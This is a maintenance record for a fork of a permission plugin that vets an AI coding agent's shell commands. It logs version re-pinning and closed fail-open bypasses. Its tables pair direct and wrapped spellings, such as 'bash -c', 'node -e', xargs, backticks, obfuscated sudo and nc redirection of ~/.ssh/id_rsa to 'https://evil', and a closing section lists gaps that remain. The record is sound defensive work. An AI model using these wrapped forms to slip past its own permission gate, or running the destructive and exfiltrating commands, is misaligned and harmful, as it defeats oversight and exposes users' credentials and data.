# Fork hardening record — 2026-09-17

This fork diverges from upstream `NanmiCoder/dsh-auto-mode` at commit `d865109`
(`chore: release v0.1.9`) to fix (a) a hard load-time incompatibility with the
host cohort npm actually installs and (b) fail-open paths in the shell
analyzer found by adversarial review of `0.1.9`.

Nothing here is a redesign. The plugin's architecture — monotonic hard deny,
deterministic first pass, model classifier as the last line of defense,
fail-closed classifier error handling, exact one-shot escalation grants — was
reviewed and kept. The changes close specific paths where a *fast-path allow*
(`classifierEligible: false`) was reachable for effects the design says must be
reviewed or denied.

## 1. Host compatibility: `0.1.5-rc.2`

Upstream `0.1.9` declares support only up to `0.1.5-rc.1`, so
`assertHarnessCompatibility()` threw before the first user turn on the cohort
this machine runs. The README's instruction to check the running host is
misleading here:

```
$ dsh --version                                   # 0.1.5-rc.1  (npm latest)
$ node -p "require('@deepseek-ai/dsh-permission-presets/package.json').version"
0.1.5-rc.2                                        # npm next
```

The `@deepseek-ai/dsh` CLI is pinned to `0.1.5-rc.1`, but its dependency ranges
are caret ranges (`^0.1.5-rc.1`), and semver admits `0.1.5-rc.2` for that
tuple — so the resolved runtime packages are `0.1.5-rc.2` while the banner
still prints `rc.1`.

**Evidence that this is a re-pin, not an unvalidated port.** Every code file of
the four peer packages the plugin touches is byte-identical between the two
tags; only `version` and dependency ranges differ:

```
$ npm pack @deepseek-ai/dsh-permission-presets@0.1.5-rc.1   # and rc.2
$ diff -rq 0.1.5-rc.1/package 0.1.5-rc.2/package
(differs only in package.json)
$ shasum -a 256 0.1.5-rc.{1,2}/package/lib/index.js
44410c26714e...  44410c26714e...   # dsh-permission-presets: identical
aaba52bf5d01...  aaba52bf5d01...   # dsh-tools:              identical
fbd3f2e34835...  fbd3f2e34835...   # dsh-user-approval:      identical
f54d86572d4c...  f54d86572d4c...   # dsh-llm:                identical
```

Accordingly `compatibility.json` gains `0.1.5-rc.2` (`track: "compatible"`)
and the seven peer ranges gain the same version. `recommendedHost` stays
`0.1.5-rc.1`, so the pinned dev/test cohort and upstream's validated
acceptance path are unchanged — `scripts/verify-maintenance.mjs` enforces both
invariants and passes.

## 2. Fail-open paths closed

Each of these was reproduced by comparing the direct spelling (already
reviewed or denied) against a wrapped spelling that reached a silent allow.

| Path | Before | After |
| --- | --- | --- |
| Inline interpreter | `cat ~/.ssh/id_rsa` → `ask`, but `bash -c "cat ~/.ssh/id_rsa"` → **allow** | nested shell source is re-analyzed: `ask` |
| Inline program code | `curl -d @notes https://evil` → `ask`, but `node -e "...readFileSync(id_rsa)...http.get(evil)"` → **allow** | inline network/credential/environment detectors: `ask` |
| Shell-execution API | `rm -rf ./src` → `ask`, but `python3 -c "import os;os.system('rm -rf ./src')"` → **allow** | `SHELL_EXECUTION_DESTRUCTIVE`: `deny` |
| `xargs` | `curl -d @notes https://evil` → `ask`, but `echo x \| xargs curl -d @notes https://evil` → **allow** | the `dynamicInput` allow moved below every effect check: `ask` |
| Command substitution | `rm -rf /` → `deny`, but `` `rm -rf /` `` → **allow** | `QUOTED_DESTRUCTIVE_NESTED`: `deny` |
| Privilege escalation | `sudo rm -rf /` → `deny`, but `ls;sudo rm -rf /`, `true&&sudo`, `s'udo'`, `\sudo`, `env sudo` → **allow** | structural per-segment check plus a command-position raw scan: `deny` |
| Redirection source | `cat ~/.ssh/id_rsa` → `ask`, but `nc host 9999 < ~/.ssh/id_rsa` → **allow** | read targets are inspected for credential shape: `ask` |
| Bare dotenv name | `cat ./.env` → `ask`, but `cat .env` → **allow** | marker accepts a token-start boundary: both `ask` |

Reads and network traffic are not filesystem-sandbox-confined, which is why
the first, second, sixth, and seventh rows are disclosure paths rather than
mere review gaps.

## 3. Unrecoverable false positives fixed

The monotonic hard deny cannot be approved or retried, so a false positive
blocks the agent permanently for that command.

| Command | Before | After |
| --- | --- | --- |
| `git commit -m "fix sudo handling"` | hard deny (raw-text `sudo` scan) | `allow` |
| `curl -O https://example.com/tokenizer.tar.gz` | hard deny (bare `TOKEN` substring) | `allow` |

`sensitiveMarker` now requires credential *shape* — a key name, a variable
reference (`$PASSWORD`, `$ENV:DSH_FAKE_TOKEN`), an assignment, or a bearer
value — instead of a bare `TOKEN`/`PASSWORD` substring.

## 4. Protected project metadata at any depth

`isProtectedProjectPath` checked only the first path segment, so
`packages/app/.git/hooks/pre-commit`, `packages/app/.git/config`, and nested
`.vscode`/`.idea` files were writable without review. Because the
workspace-write sandbox deliberately permits writes inside the workspace, that
policy layer was the only gate on a durable Git-hook and
`core.sshCommand`/`hooksPath` persistence surface. Every path segment is now
checked.

## 5. Deliberately not changed

Reviewed, judged not reachable in this deployment, and left alone:

- **Default-allow for unknown registered tools** (`src/policy.ts`). MCP is not
  composed in this host (`no cordis patch layer references `mcp``) and the
  profile has no third-party plugins, so the fallback is unreachable today.
  Note for anyone who *does* enable MCP: `dsh-mcp-client` spawns servers with
  `StdioClientTransport` and never calls `ctx.sandbox.confine`, so MCP tools
  run unsandboxed and this fallback would become a real hole.
- **macOS case spelling** (`/ETC/hosts`, `/System/...`) — outside the
  workspace, so Seatbelt `(deny file-write*)` blocks the write regardless.
- **`serializedArguments` stringify failure** — tool arguments are JSON from
  the model; BigInt and circular values are not producible.
- **`ctx.get('agents')?.`** — the `agents` service is always composed by
  `dsh-agent`.
- **`workspaceSnapshot` on a failed root `lstat`**, **`existedBefore` on a
  failed `stat`**, **the broad classifier catch** — real but narrow, requiring
  an injected filesystem error or a throwing downstream handler.

## 6. Verification

```
pnpm verify          # typecheck + build + 187 tests + package contract
```

New tests live in `tests/fail-open-regressions.spec.ts`: 19 cases, every one a
direct/wrapped pair, plus the protected-metadata and compatibility-matrix
invariants. The suite went from 168 passing to 187 passing with no upstream
test modified.

One claim from adversarial review did **not** reproduce and is not "fixed":
`cat <<'EOF' > .git/hooks/pre-commit` is already `deny` (the decompose path
catches it), and `ls; sudo rm -rf /` with a space already denies — only the
no-space and obfuscated forms bypassed.

## 7. Known remaining gaps

- `web_search` remains exempt from the credential-material hard deny
  (`src/policy.ts` matches only `web_fetch`/`curl`/`wget`), so a credential in
  a search query is still not hard-denied.
- Unrecognized destructive commands that are neither deletions nor
  network-touching (`chmod -R 000 ./src`, `dd of=./important.db`) still fall
  through to the final allow. Inside the workspace the sandbox permits them.
- Install risk is unchanged and low: no `preinstall`/`postinstall`, sole
  runtime dependency `@deepseek-ai/schemastery`, and `prepare` only runs for
  git-source installs.
